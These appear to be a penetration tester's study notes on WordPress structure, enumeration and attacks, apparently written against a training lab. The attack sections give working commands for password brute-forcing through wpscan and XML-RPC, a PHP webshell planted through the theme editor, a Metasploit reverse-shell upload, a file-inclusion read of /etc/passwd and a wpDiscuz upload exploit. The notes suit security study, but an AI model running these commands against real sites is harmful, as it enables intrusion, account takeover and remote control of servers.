---
aliases:
tags:
source:
  - https://wordpress.com/
desc:
cssclasses:
---

# file structure
	
- supporting files and directories by default are located here `/var/www/html`
- structure
	- `/index.php` is the homepage of WordPress.
	- `/license.txt` contains useful information such as the version WordPress installed.
	- `/wp-activate.php` is used for the email activation process when setting up a new WordPress site.
	- `/wp-admin` folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths:
	    - `/wp-admin/login.php`
	    - `/wp-admin/wp-login.php`
	    - `/login.php`
	    - `/wp-login.php`
	      This file can also be renamed to make it more challenging to find the login page.
	- `/xmlrpc.php` is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
	- `/wp-config.php` file contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can be useful in troubleshooting
	  ```php
		<?php
		/** <SNIP> */
		/** The name of the database for WordPress */
		define( 'DB_NAME', 'database_name_here' );
		
		/** MySQL database username */
		define( 'DB_USER', 'username_here' );
		
		/** MySQL database password */
		define( 'DB_PASSWORD', 'password_here' );
		
		/** MySQL hostname */
		define( 'DB_HOST', 'localhost' );
		
		/** Authentication Unique Keys and Salts */
		/* <SNIP> */
		define( 'AUTH_KEY',         'put your unique phrase here' );
		define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
		define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
		define( 'NONCE_KEY',        'put your unique phrase here' );
		define( 'AUTH_SALT',        'put your unique phrase here' );
		define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
		define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
		define( 'NONCE_SALT',       'put your unique phrase here' );
		
		/** WordPress Database Table prefix */
		$table_prefix = 'wp_';
		
		/** For developers: WordPress debugging mode. */
		/** <SNIP> */
		define( 'WP_DEBUG', false );
		
		/** Absolute path to the WordPress directory. */
		if ( ! defined( 'ABSPATH' ) ) {
			define( 'ABSPATH', __DIR__ . '/' );
		}
		
		/** Sets up WordPress vars and included files. */
		require_once ABSPATH . 'wp-settings.php';
		?>
	  ```
	- `/wp-content` folder is the main directory where plugins and themes are stored. *contains sensitive data*
		- `/wp-content/uploads/` is usually where any files uploaded to the platform are stored. *contains sensitive data*
		- These directories and files should be carefully enumerated as they may lead to contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities or misconfigurations.
	- `wp-includes` contains everything except for the administrative components and the themes
		- core files, such as certificates, fonts, JavaScript files, and widgets
			```
			├── theme.php
			├── update.php
			├── user.php
			├── vars.php
			├── version.php
			├── widgets
			├── widgets.php
			├── wlwmanifest.xml
			├── wp-db.php
			└── wp-diff.php
			```
		
# roles

	
- `Administrator` This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
- `Editor` An editor can publish and manage posts, including the posts of other users.
- `Author` Authors can publish and manage their own posts.
- `Contributor` These users can write and manage their own posts but cannot publish them.
- `Subscriber` These are normal users who can browse posts and edit their profiles.


# discovery

- quick way to identify a wordpress site is via the `robots.txt` file, look for `wp-`
	- 
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

Sitemap: https://inlanefreight.local/wp-sitemap.xml
```
- structure
	- `/wp-admin` contains the admin section
		- will redirect to `/wp-login.php` to authenticate
	- `/wp-content/plugins` contains the plugins
	- `/wp-content/themes` contains themes
- roles
	- `Administrator`: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
		- is usually enough to gain code execution on the server
	- `Editor`: An editor can publish and manage posts, including the posts of other users.
	- `Author`: They can publish and manage their own posts.
	- `Contributor`: These users can write and manage their own posts but cannot publish them.
	- `Subscriber`: These are standard users who can browse posts and edit their profiles.


# enumerate 

-  version `curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'`
- old versions used to have a readme in the root `curl -s -X GET http://blog.inlanefreight.com/readme.html`
- check front page looking for tags `curl -s http://blog.inlanefreight.local | grep WordPress`
- The response headers may also contain version numbers for specific plugins.
- enumerate users by checking the log in page
	- if you enter a fake user, does the page respond with username does not exist? We can then send a list of common usernames to check for valid accounts

### plugins

look for plugins on all pages (they maybe only active on contact us pages or similar)

on found plugins look for readme.txt files or similar files for more information. Check if the plugin directory have directory browsing enabled, what can we see `http://blog.inlanefreight.local/wp-content/plugins/mail-masta/`. Check for a read.me file will often contain version numbers which we can use to find vulnerablities. 


`curl -s http://blog.inlanefreight.local/ | grep plugins`

`curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`

### themes

`curl -s http://blog.inlanefreight.local/ | grep themes`

`curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`

### directory plugins

Even if a plugin is deactivated, it may still be accessible, and therefore we can gain access to its associated scripts and functions. Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.

This type of access is called `Directory Indexing`. It allows us to navigate the folder and access files that may contain sensitive information or vulnerable code.

`curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text`

#### users

##### enumerate via url

`curl -s -I http://blog.inlanefreight.com/?author=1`

check location header for possible name `Location: http://blog.inlanefreight.com/index.php/author/admin/`

can also check total number of users  `curl -s -I http://blog.inlanefreight.com/?author=100` until you get a 404

##### json endpoint

```
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
```








# attack

- login #bruteforce
	- [[wpscan]] 
		- `--password-attack`
			- `xmlrpc` fastest way! uses WordPress API to make login attempts through `/xmlrpc.ph`
				-  `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`
				- curl
					- `curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php`
						- will return a 200 if correct
						- `403 faultCode` if incorrect
					- `curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" http://154.57.164.77:32732/xmlrpc.php`
			- `wp-login` method will attempt to brute force the standard WordPress login page
		-`-U` argument takes in a list of users or a file containing user names
	- `-P` passwords option
	- `-t` flag is the number of threads
- code execution #codeexecution
	- requires administrative access to modify php source code
	- Appearance -> Theme Editor
		- `system($_GET[0]);` #shell/php
			- ![[theme_editor.webp]]
		- Click `Update File` 
		- wordpress themes are `/wp-content/themes/<theme name>`
		- code execution `curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`
- metasploit
	- `wp_admin_shell_upload`
		```bash
		msf6 > use exploit/unix/webapp/wp_admin_shell_upload 
		
		[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
		
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
		## verify
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 
		## exploit
		msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
		
		##Metasploit module uploaded the `wCoUuUPfIO.php` file to the `/wp-content/plugins` directory #cleanup 
		
		```
	- #cleanup Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices




# exploits

## mail-masta

https://wordpress.org/plugins/mail-masta/

This plugin has been closed as of September 19, 2014 and is not available for download. Reason: Unknown.

- [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438)
- [Local File Inclusion](https://www.exploit-db.com/exploits/50226)
	- `curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

## wpDiscuz 7

https://wpdiscuz.com/

- [command execution](https://www.exploit-db.com/exploits/49967)
	- https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/
	- `python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`
	- if the exploit fails, try to execute commands on the webshell path anyway
		- `curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`




